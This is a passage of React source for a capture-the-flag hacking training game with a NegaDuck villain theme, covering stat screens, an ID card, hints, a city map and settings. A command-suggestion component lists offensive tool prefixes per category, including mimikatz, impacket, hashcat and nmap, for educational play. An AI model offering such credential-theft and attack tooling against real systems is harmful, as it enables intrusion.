            <div style={{fontSize:11,color:C.textDim,letterSpacing:3,marginBottom:4}}>🦹 NEGADUCK THREAT ASSESSMENT</div>
            <div style={{display:"flex",alignItems:"center",gap:10}}>
              <div style={{fontSize:28}}>{threatLevel.icon}</div>
              <div style={{flex:1}}>
                <div style={{fontSize:16,color:threatLevel.color,letterSpacing:2}}>{threatLevel.label}</div>
                <div style={{height:4,background:C.slate,borderRadius:2,marginTop:6}}>
                  <div style={{height:"100%",width:`${Math.min(100,(save.totalScore||0)/2000*100)}%`,background:threatLevel.color,borderRadius:2,transition:"width .5s"}}/>
                </div>
              </div>
            </div>
            <div style={{fontSize:11,color:C.textDim,marginTop:6}}>
              {save.totalScore < 2000 ? `${2000-(save.totalScore||0)} pts until NegaDuck takes you seriously` : "NegaDuck is actively aware of your operations"}
            </div>
          </div>

          {/* Core stats grid */}
          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8,padding:"0 14px"}}>
            {[
              {label:"FLAGS CAPTURED",val:numSolved,sub:`of ${allChallenges.length} total`,color:C.accent},
              {label:"TOTAL SCORE",val:save.totalScore||0,sub:`of ${totalPts} pts possible`,color:C.gold},
              {label:"HINT TOKENS",val:save.hintTokens||0,sub:"available to spend",color:C.gold},
              {label:"TIME PLAYED",val:formatTime(timePlayed),sub:"in the shadows",color:C.accent},
              {label:"ACHIEVEMENTS",val:achs.length,sub:`of ${ACH_DEFS.length} total`,color:"#F5C842"},
              {label:"LOGIN STREAK",val:`${save.streak||1} days`,sub:"consecutive sessions",color:"#FF8800"},
            ].map(({label,val,sub,color})=>(
              <div key={label} style={{padding:"12px",background:C.bgCard,border:`1px solid ${C.slate}`,textAlign:"center"}}>
                <div style={{fontSize:22,color,textShadow:`0 0 8px ${color}44`}}>{val}</div>
                <div style={{fontSize:9,color:C.textDim,letterSpacing:2,marginTop:2}}>{label}</div>
                <div style={{fontSize:9,color:C.textFade,marginTop:1}}>{sub}</div>
              </div>
            ))}
          </div>

          {/* Star ratings */}
          <div style={{margin:"10px 14px 0",padding:"12px",background:C.bgCard,border:`1px solid ${C.slate}`}}>
            <div style={{fontSize:11,color:C.gold,letterSpacing:3,marginBottom:8}}>⭐ STAR PERFORMANCE</div>
            <div style={{display:"flex",gap:8}}>
              {[{n:3,label:"PERFECT",color:"#F5C842"},{n:2,label:"GOOD",color:"#C8C8C8"},{n:1,label:"COMPLETED",color:"#888"}].map(({n,label,color})=>(
                <div key={n} style={{flex:1,textAlign:"center",padding:"8px",background:C.bgDeep,border:`1px solid ${C.slate}`}}>
                  <div style={{fontSize:18,color,marginBottom:2}}>{"★".repeat(n)}</div>
                  <div style={{fontSize:20,color}}>{starCounts[n]}</div>
                  <div style={{fontSize:9,color:C.textDim,letterSpacing:1}}>{label}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Favorite category */}
          <div style={{margin:"8px 14px 0",padding:"12px",background:C.bgCard,border:`1px solid ${C.slate}`,display:"flex",gap:12,alignItems:"center"}}>
            <div style={{fontSize:32}}>{catIcon(favCat)}</div>
            <div style={{flex:1}}>
              <div style={{fontSize:11,color:C.textDim,letterSpacing:2}}>FAVORITE CATEGORY</div>
              <div style={{fontSize:18,color:catColor(favCat),letterSpacing:2}}>{favCat}</div>
              <div style={{fontSize:11,color:C.textDim}}>{catCounts[favCat]||0} challenges solved</div>
            </div>
          </div>

          {/* City progress */}
          <div style={{margin:"10px 14px 0"}}>
            <div style={{fontSize:11,color:C.textDim,letterSpacing:3,marginBottom:8}}>🗺 CITY PROGRESS</div>
            {cityProgress.map(city=>{
              const col=city.pct===100?C.teal:city.pct>0?C.gold:C.textFade;
              return (
                <div key={city.id} style={{marginBottom:8}}>
                  <div style={{display:"flex",justifyContent:"space-between",marginBottom:3}}>
                    <span style={{fontSize:13,color:col}}>{city.flag} {city.name}</span>
                    <span style={{fontSize:12,color:C.textDim}}>{city.done}/{city.total}</span>
                  </div>
                  <div style={{height:3,background:C.slate,borderRadius:2}}>
                    <div style={{height:"100%",width:`${city.pct}%`,background:col,boxShadow:city.pct===100?`0 0 6px ${col}`:"none",transition:"width .5s",borderRadius:2}}/>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Solve history */}
          <div style={{margin:"10px 14px 0"}}>
            <div style={{fontSize:11,color:C.textDim,letterSpacing:3,marginBottom:8}}>📋 SOLVE HISTORY</div>
            {allChallenges.filter(c=>solved[c.id]).length===0
              ? <div style={{fontSize:13,color:C.textFade,padding:"12px",textAlign:"center"}}>No flags captured yet. Get to work, operative.</div>
              : allChallenges.filter(c=>solved[c.id]).map(c=>{
                const s=solved[c.id];
                return (
                  <div key={c.id} style={{display:"flex",alignItems:"center",gap:10,padding:"8px 0",borderBottom:`1px solid ${C.slate}`}}>
                    <div style={{fontSize:14,color:catColor(c.category)}}>{catIcon(c.category)}</div>
                    <div style={{flex:1}}>
                      <div style={{fontSize:13,color:C.text}}>{c.title}</div>
                      <div style={{fontSize:10,color:C.textDim}}>{c.category} · {s.penalty>0?`-${s.penalty}pts penalty`:""}</div>
                    </div>
                    <div style={{textAlign:"right"}}>
                      <div style={{fontSize:13,color:C.gold}}>{s.pts}pts</div>
                      <div style={{fontSize:12,color:"#F5C842"}}>{"★".repeat(stars[c.id]||0)}{"☆".repeat(3-(stars[c.id]||0))}</div>
                    </div>
                  </div>
                );
              })
            }
          </div>
        </div>
      )}

      {/* ── SPY ID CARD VIEW ── */}
      {view==="card" && (
        <div style={{padding:"16px 14px 40px"}}>
          <div style={{fontSize:10,color:C.textDim,letterSpacing:3,marginBottom:12,textAlign:"center"}}>CLASSIFIED OPERATOR IDENTIFICATION</div>

          {/* The card */}
          <div style={{background:`linear-gradient(135deg,${C.bgCard} 0%,${C.purple}33 50%,${C.bgCard} 100%)`,border:`2px solid ${C.gold}`,padding:"20px 18px",position:"relative",overflow:"hidden",boxShadow:`0 0 30px ${C.gold}22`}}>
            {/* Background pattern */}
            <div style={{position:"absolute",inset:0,backgroundImage:`repeating-linear-gradient(45deg,${C.purple}11 0px,${C.purple}11 1px,transparent 1px,transparent 8px)`,pointerEvents:"none"}}/>
            {/* Corner accents */}
            <div style={{position:"absolute",top:8,left:8,width:16,height:16,borderTop:`2px solid ${C.gold}`,borderLeft:`2px solid ${C.gold}`}}/>
            <div style={{position:"absolute",top:8,right:8,width:16,height:16,borderTop:`2px solid ${C.gold}`,borderRight:`2px solid ${C.gold}`}}/>
            <div style={{position:"absolute",bottom:8,left:8,width:16,height:16,borderBottom:`2px solid ${C.gold}`,borderLeft:`2px solid ${C.gold}`}}/>
            <div style={{position:"absolute",bottom:8,right:8,width:16,height:16,borderBottom:`2px solid ${C.gold}`,borderRight:`2px solid ${C.gold}`}}/>

            {/* Header */}
            <div style={{textAlign:"center",marginBottom:16,position:"relative"}}>
              <div style={{fontSize:10,color:C.gold,letterSpacing:6,marginBottom:2}}>DARKWING</div>
              <div style={{fontSize:8,color:C.textDim,letterSpacing:4}}>AUTHORIZED OPERATOR · CLASSIFIED</div>
            </div>

            {/* Main content */}
            <div style={{display:"flex",gap:16,marginBottom:16,position:"relative"}}>
              {/* Avatar */}
              <div style={{width:72,height:90,background:C.bgDeep,border:`1px solid ${C.gold}`,display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",flexShrink:0}}>
                <div style={{fontSize:36}}>{rank.icon}</div>
                <div style={{fontSize:8,color:C.gold,letterSpacing:1,marginTop:4}}>OPERATIVE</div>
              </div>
              {/* Info */}
              <div style={{flex:1}}>
                <div style={{fontSize:9,color:C.textDim,letterSpacing:2}}>CALLSIGN</div>
                <div style={{fontSize:22,color:C.gold,letterSpacing:3,textShadow:`0 0 8px ${C.gold}88`,marginBottom:8}}>{save.playerHandle||"OPERATIVE"}</div>
                <div style={{fontSize:9,color:C.textDim,letterSpacing:2}}>CLEARANCE LEVEL</div>
                <div style={{fontSize:14,color:rank.color,letterSpacing:2,marginBottom:6}}>{rank.label}</div>
                <div style={{fontSize:9,color:C.textDim,letterSpacing:2}}>THREAT TO NEGADUCK</div>
                <div style={{fontSize:12,color:threatLevel.color,letterSpacing:1}}>{threatLevel.label}</div>
              </div>
            </div>

            {/* Stats strip */}
            <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:6,marginBottom:14,position:"relative"}}>
              {[
                {label:"FLAGS",val:numSolved},
                {label:"SCORE",val:save.totalScore||0},
                {label:"XP",val:save.totalXP||0},
                {label:"BADGES",val:achs.length},
              ].map(({label,val})=>(
                <div key={label} style={{textAlign:"center",padding:"6px 4px",background:C.bgDeep,border:`1px solid ${C.slate}`}}>
                  <div style={{fontSize:16,color:C.teal}}>{val}</div>
                  <div style={{fontSize:7,color:C.textDim,letterSpacing:1}}>{label}</div>
                </div>
              ))}
            </div>

            {/* Operative mode */}
            <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"8px 10px",background:C.bgDeep,border:`1px solid ${C.slate}`,marginBottom:10,position:"relative"}}>
              <div style={{fontSize:9,color:C.textDim,letterSpacing:2}}>OPERATIVE MODE</div>
              <div style={{fontSize:13,color:(OP_MODES[save.opMode]||OP_MODES.junior).color,letterSpacing:2}}>
                {(OP_MODES[save.opMode]||OP_MODES.junior).icon} {(OP_MODES[save.opMode]||OP_MODES.junior).label}
              </div>
            </div>

            {/* Favorite category */}
            <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"8px 10px",background:C.bgDeep,border:`1px solid ${C.slate}`,marginBottom:14,position:"relative"}}>
              <div style={{fontSize:9,color:C.textDim,letterSpacing:2}}>SPECIALIZATION</div>
              <div style={{fontSize:13,color:catColor(favCat)}}>{catIcon(favCat)} {favCat}</div>
            </div>

            {/* Barcode-style decorative strip */}
            <div style={{display:"flex",gap:1,height:16,marginBottom:8,position:"relative"}}>
              {Array.from({length:60}).map((_,i)=>(
                <div key={i} style={{flex:1,background:i%3===0?C.gold:i%7===0?C.teal:C.slate,opacity:0.4+Math.sin(i)*0.3}}/>
              ))}
            </div>

            {/* Footer */}
            <div style={{display:"flex",justifyContent:"space-between",position:"relative"}}>
              <div style={{fontSize:8,color:C.textFade,letterSpacing:1}}>ID: DW-{(save.totalXP||0).toString().padStart(6,"0")}</div>
              <div style={{fontSize:8,color:C.textFade,letterSpacing:1}}>🦆 LET'S GET DANGEROUS</div>
            </div>
          </div>

          {/* Achievement badges on card */}
          {achs.length>0 && (
            <div style={{marginTop:12,padding:"12px",background:C.bgCard,border:`1px solid ${C.slate}`}}>
              <div style={{fontSize:11,color:C.gold,letterSpacing:3,marginBottom:8}}>EARNED BADGES</div>
              <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
                {achs.map(id=>{
                  const def=ACH_DEFS.find(a=>a.id===id);
                  if(!def) return null;
                  return (
                    <div key={id} style={{display:"flex",alignItems:"center",gap:4,padding:"4px 8px",background:C.bgDeep,border:`1px solid ${C.gold}33`,fontSize:12}}>
                      <span>{def.icon}</span>
                      <span style={{color:C.textDim,fontSize:10,letterSpacing:1}}>{def.label}</span>
                    </div>
                  );
                })}
              </div>
            </div>
          )}
        </div>
      )}

      <style>{`*{box-sizing:border-box} ::-webkit-scrollbar{width:3px} ::-webkit-scrollbar-thumb{background:${C.purple}}`}</style>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════════
// RANK UP MODAL
// ══════════════════════════════════════════════════════════════════
function RankUpModal({rank,onClose,C}) {
  if(!rank) return null;
  useEffect(()=>{soundEngine.play("rankup");haptic.rankup();},[]);
  return (
    <div style={{position:"fixed",inset:0,zIndex:200,background:"rgba(0,0,0,0.92)",display:"flex",alignItems:"center",justifyContent:"center"}}>
      <div style={{background:C.bgCard,border:`2px solid ${rank.color}`,padding:"32px 24px",textAlign:"center",maxWidth:320,margin:"0 16px",animation:"rankUp .5s cubic-bezier(0.34,1.56,0.64,1)",boxShadow:`0 0 40px ${rank.color}44`}}>
        <div style={{fontSize:60,marginBottom:10,animation:"spin 1s ease"}}>{rank.icon}</div>
        <div style={{fontSize:14,color:C.textDim,letterSpacing:4,marginBottom:8}}>RANK UNLOCKED</div>
        <div style={{fontSize:30,color:rank.color,letterSpacing:4,textShadow:`0 0 24px ${rank.color}`,marginBottom:12}}>{rank.label}</div>
        <div style={{fontSize:16,color:C.accent,marginBottom:24}}>🦆 "{duck("rankUp")}"</div>
        <button onClick={onClose} style={{padding:"14px 32px",background:rank.color,border:"none",color:"#000",fontFamily:"'VT323',monospace",fontSize:22,letterSpacing:3,cursor:"pointer"}}>
          LET'S GET DANGEROUS
        </button>
      </div>
      <style>{`@keyframes rankUp{from{transform:scale(0.4) rotate(-12deg);opacity:0}to{transform:scale(1);opacity:1}} @keyframes spin{from{transform:rotate(-20deg) scale(0.8)}to{transform:rotate(0)scale(1)}}`}</style>
    </div>
  );
}

function AchToast({id,onDone,C}) {
  useEffect(()=>{if(id){soundEngine.play("achievement");haptic.success();const t=setTimeout(onDone,3500);return()=>clearTimeout(t);}},[id]);
  if(!id) return null;
  const def=ACH_DEFS.find(a=>a.id===id); if(!def) return null;
  return (
    <div style={{position:"fixed",top:76,left:14,right:14,zIndex:300,background:C.bgCard,border:`1px solid ${C.gold}`,borderLeft:`4px solid ${C.gold}`,padding:"12px 16px",display:"flex",alignItems:"center",gap:14,animation:"slideDown .4s ease",boxShadow:`0 4px 24px ${C.gold}33`}}>
      <div style={{fontSize:32}}>{def.icon}</div>
      <div style={{flex:1}}>
        <div style={{fontSize:13,color:C.gold,letterSpacing:3}}>ACHIEVEMENT UNLOCKED</div>
        <div style={{fontSize:19,color:C.text}}>{def.label}</div>
        <div style={{fontSize:14,color:C.textDim}}>{def.desc} · +{def.xp}XP</div>
      </div>
    </div>
  );
}

function Stars({count,size=14,C}) {
  return <span>{[1,2,3].map(i=><span key={i} style={{fontSize:size,color:i<=count?"#F5C842":C.textFade,textShadow:i<=count?"0 0 6px #F5C842":"none"}}>★</span>)}</span>;
}

function CmdBar({onSelect,category,C}) {
  const rel=CMD_SUGG.filter(c=>{
    if(category==="CRYPTO") return ["echo","hashcat","hash-identifier","base64","python3","jwt"].some(k=>c.startsWith(k));
    if(category==="FORENSICS") return ["exiftool","strings","tcpdump","grep","volatility","steghide"].some(k=>c.startsWith(k));
    if(category==="PRIVESC"||category==="AD") return ["sudo","find","python3","mimikatz","impacket"].some(k=>c.startsWith(k));
    if(category==="CLOUD") return ["aws","curl"].some(k=>c.startsWith(k));
    if(category==="NETWORK"||category==="MOBILE") return ["tcpdump","arp","adb","apktool","nmap"].some(k=>c.startsWith(k));
    return true;
  }).slice(0,12);
  return (
    <div style={{display:"flex",overflowX:"auto",gap:6,padding:"7px 12px",background:C.bgDeep,borderTop:`1px solid ${C.slate}`,flexShrink:0}}>
      {rel.map(cmd=>(
        <button key={cmd} onClick={()=>{onSelect(cmd+" ");soundEngine.play("keypress");haptic.light();}}
          style={{padding:"5px 12px",fontSize:14,fontFamily:"'VT323',monospace",whiteSpace:"nowrap",background:C.bgCard,border:`1px solid ${C.slateHi}`,color:C.textDim,cursor:"pointer",flexShrink:0}}>
          {cmd}
        </button>
      ))}
    </div>
  );
}

function HintPanel({challenge,hintTokens,unlockedHints,penaltyTotal,onSpend,C}) {
  const [confirm,setConfirm]=useState(null);
  const confirmTimer=useRef(null);
  const handle=(tier,cost,penalty)=>{
    if(confirm===tier){onSpend(tier,cost,penalty);setConfirm(null);clearTimeout(confirmTimer.current);}
    else{setConfirm(tier);clearTimeout(confirmTimer.current);confirmTimer.current=setTimeout(()=>setConfirm(null),3000);}
  };
  useEffect(()=>()=>clearTimeout(confirmTimer.current),[]);
  return (
    <div style={{margin:"0 14px 10px",border:`1px solid ${C.slateHi}`,background:C.bgDeep}}>
      <div style={{display:"flex",justifyContent:"space-between",padding:"10px 14px",borderBottom:`1px solid ${C.slate}`,background:C.bgCard}}>
        <span style={{fontSize:17,color:C.gold,letterSpacing:3}}>⚡ HINTS</span>
        <span style={{fontSize:19,color:C.gold}}>{hintTokens}🪙</span>
      </div>
      {penaltyTotal>0&&<div style={{padding:"6px 14px",background:"rgba(255,68,102,0.10)",fontSize:14,color:"#FF4466",letterSpacing:2}}>⚠ PENALTY: -{penaltyTotal}pts</div>}
      <div style={{padding:"10px 12px"}}>
        {HINT_TIERS.map(({tier,label,cost,color,penalty})=>{
          const unlocked=unlockedHints.includes(tier);
          const hint=challenge.hints?.find(h=>h.tier===tier);
          if(!hint) return null;
          return (
            <div key={tier} style={{marginBottom:8,padding:"11px 13px",border:`1px solid ${unlocked?color+"66":C.slateHi}`,background:unlocked?color+"0E":C.bgCard}}>
              <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:unlocked?8:0}}>
                <span style={{fontSize:14,color,letterSpacing:2,border:`1px solid ${color}44`,padding:"2px 8px"}}>{unlocked?"✓":"T"+tier} {label}</span>
                {!unlocked&&<button onClick={()=>handle(tier,cost,penalty)} disabled={hintTokens<cost}
                  style={{padding:"5px 14px",fontSize:14,fontFamily:"'VT323',monospace",cursor:hintTokens<cost?"not-allowed":"pointer",background:confirm===tier?color:"transparent",border:`1px solid ${hintTokens<cost?C.textFade:color}`,color:confirm===tier?"#000":hintTokens<cost?C.textFade:color}}>
                  {confirm===tier?"CONFIRM?":`${cost}🪙 -${penalty}pts`}
                </button>}
              </div>
              {unlocked&&<div style={{fontSize:15,color:C.text,lineHeight:1.65}}>{hint.text}</div>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

function WorldMap({solvedFlags,onCitySelect,opMode,C}) {
  const [hovered,setHovered]=useState(null);
  const mode=OP_MODES[opMode]||OP_MODES.junior;
  const sc={cleared:C.teal,active:C.gold,locked:C.textFade,available:C.purple,empty:C.textFade};
  return (
    <div style={{paddingBottom:16}}>
      <div style={{margin:"10px 14px",padding:"12px 16px",background:"rgba(255,68,102,0.07)",border:"1px solid rgba(255,68,102,0.25)",borderLeft:"4px solid #FF4466",display:"flex",gap:12,alignItems:"flex-start"}}>
        <div style={{fontSize:24,flexShrink:0}}>🦹</div>
        <div>
          <div style={{fontSize:13,color:"#FF4466",letterSpacing:3,marginBottom:4}}>NEGADUCK INTERCEPT</div>
          <div style={{fontSize:16,color:"#DDA0A0",lineHeight:1.6,fontStyle:"italic"}}>"{mode.negaLines[Math.floor(Date.now()/30000)%mode.negaLines.length]}"</div>
        </div>
      </div>
      <div style={{margin:"8px 12px",position:"relative",minHeight:220,background:`linear-gradient(135deg,${C.bgDeep} 0%,${C.purple}22 50%,${C.bgDeep} 100%)`,border:`2px solid ${C.purple}`,overflow:"hidden"}}>
        <div style={{position:"absolute",inset:0,backgroundImage:`radial-gradient(${C.purple}44 1px,transparent 1px)`,backgroundSize:"20px 20px",opacity:0.4}}/>
        <svg style={{position:"absolute",inset:0,width:"100%",height:"100%",opacity:0.1}}>
          {[20,40,60,80].map(y=><line key={"h"+y} x1="0%" y1={`${y}%`} x2="100%" y2={`${y}%`} stroke={C.teal} strokeWidth="0.5"/>)}
          {[20,40,60,80].map(x=><line key={"v"+x} x1={`${x}%`} y1="0%" x2={`${x}%`} y2="100%" stroke={C.teal} strokeWidth="0.5"/>)}
        </svg>
        <div style={{position:"absolute",top:8,left:12,fontSize:14,color:C.textDim,letterSpacing:2,zIndex:2}}>DARKWING OPS MAP — 7 TARGETS</div>
        {CITIES_FULL.map(city=>{
          const st=getCityStatus(city,solvedFlags); const col=sc[st]; const isH=hovered===city.id;
          return (
            <div key={city.id} style={{position:"absolute",left:`${city.x}%`,top:`${city.y}%`,transform:"translate(-50%,-50%)",zIndex:3,cursor:"pointer"}}
              onClick={()=>{onCitySelect(city);soundEngine.play("navigate");haptic.medium();}}
              onMouseEnter={()=>{setHovered(city.id);soundEngine.play("navigate");}}
              onMouseLeave={()=>setHovered(null)}>
              {st==="active"&&<div style={{position:"absolute",inset:-8,borderRadius:"50%",border:`1px solid ${col}`,animation:"pingRing 2s infinite",opacity:0.5}}/>}
              <div style={{width:48,height:48,borderRadius:"50%",background:C.bgCard,border:`2px solid ${col}`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:22,boxShadow:isH?`0 0 18px ${col}`:"none",transition:"all .2s",transform:isH?"scale(1.2)":"scale(1)"}}>
                {city.flag}
              </div>
              <div style={{position:"absolute",top:50,left:"50%",transform:"translateX(-50%)",whiteSpace:"nowrap",fontSize:13,color:col,letterSpacing:1,background:C.bgDeep+"DD",padding:"2px 8px"}}>{city.name.toUpperCase()}</div>
              <div style={{position:"absolute",top:-2,right:-2,width:8,height:8,borderRadius:"50%",background:col,boxShadow:`0 0 4px ${col}`}}/>
            </div>
          );
        })}
      </div>
      {hovered&&(()=>{
        const city=CITIES_FULL.find(c=>c.id===hovered); if(!city) return null;
        const st=getCityStatus(city,solvedFlags); const col=sc[st];
        const done=city.challenges.filter(id=>solvedFlags?.[id]).length;
        return (
          <div style={{margin:"0 14px 10px",padding:"12px 16px",background:C.bgCard,border:`1px solid ${col}55`,borderLeft:`4px solid ${col}`,animation:"fadeIn .2s ease"}}>
            <div style={{display:"flex",justifyContent:"space-between",marginBottom:5}}>
              <div style={{fontSize:20,color:col}}>{city.flag} {city.name}</div>
              <div style={{fontSize:14,color:col,border:`1px solid ${col}55`,padding:"2px 8px"}}>{st.toUpperCase()}</div>
            </div>
            <div style={{fontSize:14,color:C.textDim,marginBottom:4}}>{city.category}</div>
            <div style={{fontSize:15,color:col}}>{done}/{city.challenges.length} challenges captured</div>
          </div>
        );
      })()}
      <div style={{display:"flex",gap:12,padding:"0 14px",flexWrap:"wrap"}}>
        {[{c:C.teal,l:"CLEARED"},{c:C.gold,l:"IN PROGRESS"},{c:C.purple,l:"AVAILABLE"},{c:C.textFade,l:"LOCKED"}].map(({c,l})=>(
          <div key={l} style={{display:"flex",alignItems:"center",gap:5}}>
            <div style={{width:10,height:10,borderRadius:"50%",background:c,boxShadow:`0 0 4px ${c}`}}/>
            <span style={{fontSize:14,color:C.textDim,letterSpacing:1}}>{l}</span>
          </div>
        ))}
      </div>
      <style>{`@keyframes pingRing{0%{transform:scale(1);opacity:.5}100%{transform:scale(2.5);opacity:0}} @keyframes fadeIn{from{opacity:0}to{opacity:1}}`}</style>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════════
// SETTINGS SCREEN (with mode toggle)
// ══════════════════════════════════════════════════════════════════
function SettingsScreen({save,onUpdate,onBack,onReset,C}) {
  const [confirmReset,setConfirmReset]=useState(false);
  const [handleEdit,setHandleEdit]=useState(save.playerHandle);
  const [saved,setSaved]=useState(false);

  const upd=(k,v)=>{soundEngine.play("navigate");haptic.light();onUpdate(k,v);};
  const updS=(k,v)=>{soundEngine.play("navigate");haptic.light();onUpdate("settings",{...save.settings,[k]:v});};

  const row=(label,sub,control)=>(
    <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"14px 0",borderBottom:`1px solid ${C.slate}`}}>
      <div><div style={{fontSize:17,color:C.text,letterSpacing:1}}>{label}</div>{sub&&<div style={{fontSize:14,color:C.textDim,marginTop:3}}>{sub}</div>}</div>
      {control}
    </div>
  );
  const toggle=(val,onChange)=>(
    <div onClick={()=>onChange(!val)} style={{width:44,height:24,borderRadius:12,background:val?C.accent:C.slate,cursor:"pointer",position:"relative",transition:"background .2s",border:`1px solid ${val?C.accent:C.slateHi}`}}>
      <div style={{position:"absolute",top:3,left:val?22:3,width:16,height:16,borderRadius:"50%",background:val?"#000":C.textDim,transition:"left .2s"}}/>
    </div>
  );

  return (
    <div style={{fontFamily:"'VT323',monospace",background:C.bg,color:C.text,minHeight:"100vh",maxWidth:480,margin:"0 auto"}}>
      <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet"/>
      <div style={{background:C.bgDeep,borderBottom:`2px solid ${C.purple}`,padding:"10px 16px",display:"flex",alignItems:"center",gap:12,position:"sticky",top:0,zIndex:10}}>
        <button onClick={onBack} style={{background:"none",border:`1px solid ${C.accent}`,color:C.accent,fontFamily:"'VT323',monospace",fontSize:16,padding:"6px 14px",cursor:"pointer"}}>← BACK</button>
        <div style={{fontSize:24,color:C.gold,letterSpacing:4}}>⚙ SETTINGS</div>
      </div>

      <div style={{padding:"0 16px 40px"}}>
        {/* OPERATIVE */}
        <div style={{fontSize:14,color:C.accent,letterSpacing:4,margin:"18px 0 8px",paddingBottom:5,borderBottom:`1px solid ${C.purpleHi}`}}>OPERATIVE</div>
        <div style={{padding:"14px 0",borderBottom:`1px solid ${C.slate}`}}>
          <div style={{fontSize:17,color:C.text,letterSpacing:1,marginBottom:10}}>CALLSIGN</div>
          <div style={{display:"flex",gap:8}}>
            <input value={handleEdit} onChange={e=>setHandleEdit(e.target.value.toUpperCase())}
              style={{flex:1,background:C.bgDeep,border:`1px solid ${C.purpleHi}`,borderBottom:`2px solid ${C.accent}`,outline:"none",color:"#fff",fontFamily:"'VT323',monospace",fontSize:16,padding:"8px 10px",caretColor:C.accent,boxSizing:"border-box"}}
              maxLength={20} autoCapitalize="characters" autoCorrect="off" spellCheck={false}/>
            <button onClick={()=>{if(!handleEdit.trim()) return; upd("playerHandle",handleEdit.trim()); setSaved(true); soundEngine.play("achievement"); haptic.success(); setTimeout(()=>setSaved(false),2000);}}
              style={{padding:"8px 14px",background:saved?C.accent:"transparent",border:`1px solid ${C.accent}`,color:saved?"#000":C.accent,fontFamily:"'VT323',monospace",fontSize:14,cursor:"pointer",transition:"all .2s"}}>
              {saved?"✓ SAVED":"SAVE"}
            </button>
          </div>
        </div>

        {/* Mode toggle — KEY NEW FEATURE */}
        <div style={{padding:"14px 0",borderBottom:`1px solid ${C.slate}`}}>
          <div style={{fontSize:17,color:C.text,letterSpacing:1,marginBottom:5}}>OPERATIVE MODE</div>
          <div style={{fontSize:14,color:C.textDim,marginBottom:12}}>Controls NegaDuck's tone and mission briefing style</div>
          {Object.entries(OP_MODES).map(([key,mode])=>(
            <div key={key} onClick={()=>upd("opMode",key)}
              style={{display:"flex",alignItems:"center",gap:14,padding:"12px 14px",marginBottom:8,border:`1px solid ${save.opMode===key?mode.color:C.slateHi}`,background:save.opMode===key?mode.color+"18":C.bgCard,cursor:"pointer",transition:"all .2s"}}>
              <div style={{fontSize:26}}>{mode.icon}</div>
              <div style={{flex:1}}>
                <div style={{fontSize:17,color:save.opMode===key?mode.color:C.text,letterSpacing:1}}>{mode.label}</div>
                <div style={{fontSize:14,color:C.textDim,marginTop:3}}>{key==="junior"?"Cartoon villain · Kid-friendly":key==="shadow"?"Serious threat · Comic flair":"Full noir · Nation state"}</div>
              </div>
              {save.opMode===key&&<div style={{color:mode.color,fontSize:20}}>✓</div>}
            </div>
          ))}
        </div>

        {/* AUDIO */}
        <div style={{fontSize:14,color:C.accent,letterSpacing:4,margin:"18px 0 8px",paddingBottom:5,borderBottom:`1px solid ${C.purpleHi}`}}>AUDIO & FEEL</div>
        {row("SOUND EFFECTS","Retro beeps · Achievement chimes · Rank-up fanfare",toggle(save.settings.soundEnabled,v=>{updS("soundEnabled",v);soundEngine.enabled=v;if(v){soundEngine.init();soundEngine.play("navigate");}}))}
        {row("HAPTIC FEEDBACK","Vibration on captures · Errors · Rank-up",toggle(save.settings.hapticsEnabled,v=>{updS("hapticsEnabled",v);haptic.enabled=v;if(v)haptic.medium();}))}
        <div style={{padding:"12px 0 14px",borderBottom:`1px solid ${C.slate}`}}>
          <div style={{fontSize:14,color:C.textDim,letterSpacing:2,marginBottom:10}}>TEST SOUNDS</div>
          <div style={{display:"flex",gap:7,flexWrap:"wrap"}}>
            {[{l:"KEYPRESS",s:"keypress"},{l:"ERROR",s:"error"},{l:"FLAG ⚑",s:"flag"},{l:"RANK UP",s:"rankup"},{l:"QUACK 🦆",s:"quack"},{l:"BRIEFING",s:"briefing"}].map(({l,s})=>(
              <button key={s} onClick={()=>{soundEngine.init();soundEngine.play(s);haptic.light();}}
                style={{padding:"6px 13px",fontSize:15,letterSpacing:1,fontFamily:"'VT323',monospace",background:"transparent",border:`1px solid ${C.slateHi}`,color:C.textDim,cursor:"pointer"}}>
                {l}
              </button>
            ))}
          </div>
        </div>

        {/* THEME */}
        <div style={{fontSize:14,color:C.accent,letterSpacing:4,margin:"18px 0 8px",paddingBottom:5,borderBottom:`1px solid ${C.purpleHi}`}}>THEME</div>
        <div style={{padding:"10px 0",borderBottom:`1px solid ${C.slate}`}}>
          {Object.entries(THEMES).map(([key,theme])=>(
            <div key={key} onClick={()=>updS("theme",key)}
              style={{display:"flex",alignItems:"center",gap:14,padding:"12px 14px",marginBottom:8,border:`2px solid ${save.settings.theme===key?theme.teal:C.slateHi}`,background:save.settings.theme===key?theme.purple+"28":C.bgCard,cursor:"pointer",transition:"all .2s"}}>
              <div style={{fontSize:28}}>{theme.icon}</div>
              <div style={{flex:1}}>
                <div style={{fontSize:18,color:save.settings.theme===key?theme.teal:C.text,letterSpacing:2}}>{theme.name}</div>
                <div style={{fontSize:14,color:C.textDim,marginTop:3}}>{theme.desc}</div>
                <div style={{display:"flex",gap:5,marginTop:8}}>
                  {[theme.bg,theme.purple,theme.teal,theme.gold,theme.red].map((col,i)=><div key={i} style={{width:20,height:10,background:col,border:`1px solid ${C.slateHi}`}}/>)}
                </div>
              </div>
              {save.settings.theme===key&&<div style={{color:theme.teal,fontSize:20}}>✓</div>}
            </div>
          ))}
        </div>

        {/* DANGER ZONE */}
        <div style={{fontSize:14,color:"#FF4466",letterSpacing:4,margin:"18px 0 8px",paddingBottom:5,borderBottom:"1px solid rgba(255,68,102,0.25)"}}>DANGER ZONE</div>
        <div style={{padding:"14px 0"}}>
          <div style={{fontSize:15,color:C.textDim,marginBottom:12,lineHeight:1.6}}>Reset all progress — flags, XP, achievements, tokens. Cannot be undone.</div>
